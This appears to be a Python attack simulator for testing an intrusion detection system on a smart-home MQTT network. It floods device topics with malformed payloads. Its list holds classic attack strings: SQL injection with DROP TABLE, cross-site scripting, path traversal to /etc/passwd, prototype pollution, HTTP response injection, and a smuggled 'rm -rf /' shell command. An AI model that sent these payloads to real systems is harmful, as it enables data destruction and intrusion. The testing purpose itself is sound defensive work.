"""
Malformed Payload Attack: Sends corrupt, oversized, or maliciously
crafted payloads to test input validation and parsing robustness.

IDS should detect: payload_integrity violations, suspicious_patterns
"""

import time
import random
import paho.mqtt.client as mqtt

TARGET_TOPICS = [
    "home/thermo/data",
    "home/lighting/data",
    "home/sound/data",
    "home/door/data",
    "home/camera/data",
    "home/smart-plug/data",
]

MALFORMED_PAYLOADS = [
    "\x00\x01\x02\x03\x04\x05\xff\xfe\xfd",
    "SELECT * FROM users WHERE 1=1; DROP TABLE devices;--",
    "<script>alert('xss')</script>",
    "../../../../etc/passwd",
    "\\x00\\x41\\x42\\x43" * 50,
    "A" * 2000,
    '{"__proto__":{"admin":true}}',
    "temperature=NaN&overflow=true",
    "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Injected</h1>",
    "",
    "   ",
    '{"payload": "' + "x" * 1500 + '"}',
    "true; rm -rf /; echo pwned",
    "day\x00night\x00override",
]


def run(broker_ip, duration=20, interval=1.5):
    """Malformed payload attack: send corrupt data."""
    print(f"[ATTACK] Malformed - Connecting to {broker_ip}")

    client = mqtt.Client(client_id="malform-bot")
    client.connect(broker_ip, 1883, 60)
    client.loop_start()

    end_time = time.time() + duration
    count = 0

    print(f"[ATTACK] Malformed - Sending corrupt payloads for {duration}s")
    while time.time() < end_time:
        topic = random.choice(TARGET_TOPICS)
        payload = random.choice(MALFORMED_PAYLOADS)
        client.publish(topic, payload)
        preview = repr(payload[:60])
        print(f"  -> {topic}: {preview}")
        count += 1
        time.sleep(interval)

    client.loop_stop()
    client.disconnect()
    print(f"[ATTACK] Malformed complete. Sent {count} payloads.")
    return count
